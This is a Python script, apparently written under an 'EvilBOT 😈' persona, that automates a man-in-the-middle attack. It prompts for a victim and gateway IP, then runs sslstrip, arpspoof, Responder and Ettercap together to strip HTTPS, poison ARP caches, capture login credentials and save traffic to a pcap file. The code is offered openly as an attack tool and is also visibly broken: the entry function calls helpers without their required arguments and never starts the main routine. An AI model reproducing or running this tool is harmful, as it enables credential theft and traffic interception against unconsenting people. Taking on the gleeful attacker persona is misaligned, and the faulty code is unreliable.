import subprocess
import time


def start_sslstrip(interface):
    print("<EvilBOT 😈>: Starting SSLstrip...")
    subprocess.run(['sslstrip', '-i', interface], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)


def start_arpspoof(interface, victim_ip, gateway_ip):
    print("<EvilBOT 😈>: Starting ARP Spoofing...")
    subprocess.run(['arpspoof', '-i', interface, '-t', victim_ip, gateway_ip], shell=True, stdout=subprocess.PIPE,
                   stderr=subprocess.PIPE)


def start_responder(interface):
    print("<EvilBOT 😈>: Starting Responder...")
    subprocess.run(['responder', '-I', interface, '-rdwbfv'], shell=True, stdout=subprocess.PIPE,
                   stderr=subprocess.PIPE)


def start_ettercap(interface):
    print("<EvilBOT 😈>: Starting Ettercap...")
    subprocess.run(['ettercap', '-TqM', 'arp:remote', '-i', interface, '-S', '-L', '-w', 'captured.pcap'], shell=True,
                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)


def mitm():
    print("<EvilBOT 😈>: Initiating MITM attack...")

    # Get the victim's IP address and the gateway's IP address
    victim_ip = input("<EvilBOT 😈>: Enter victim IP: ")
    gateway_ip = input("<EvilBOT 😈>: Enter gateway IP: ")
    # Get the name of the network interface to use
    interface: str = input("<EvilBOT 😈>: Enter name of network interface to use: ")

    # Start SSLstrip to strip HTTPS encryption
    sslstrip_process = subprocess.Popen(['sslstrip', '-i', interface, '-a'], stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE)

    # Use arpspoof to perform ARP spoofing
    arpspoof_process = subprocess.Popen(['arpspoof', '-i', interface, '-t', victim_ip, gateway_ip],
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Use responder to capture authentication credentials
    responder_process = subprocess.Popen(['responder', '-I', interface, '-rdwbfv'], stdout=subprocess.PIPE,
                                         stderr=subprocess.PIPE)

    # Use Ettercap to sniff and modify network traffic
    ettercap_process = subprocess.Popen(
        ['ettercap', '-TqM', 'arp:remote', '-i', interface, '-S', '-L', '-w', 'captured.pcap'], stdout=subprocess.PIPE,
        stderr=subprocess.PIPE)

    # Store all subprocesses in a list for monitoring
    processes = [sslstrip_process, arpspoof_process, responder_process, ettercap_process]

    try:
        # Wait for all processes to complete
        while True:
            if all(p.poll() is not None for p in processes):
                break
            time.sleep(1)
    except KeyboardInterrupt:
        # Terminate all subprocesses on keyboard interrupt
        for p in processes:
            p.terminate()

    # Check for errors in subprocesses
    for p in processes:
        if p.returncode != 0:
            print(f"Error in process {p.args}")
            print(p.stderr)
            return
    print("<EvilBOT 😈>: MITM attack complete.")


def starterpos():
    start_responder()
    start_sslstrip()
    start_ettercap()
    start_ettercap()


if __name__ == "__main__":
    starterpos()
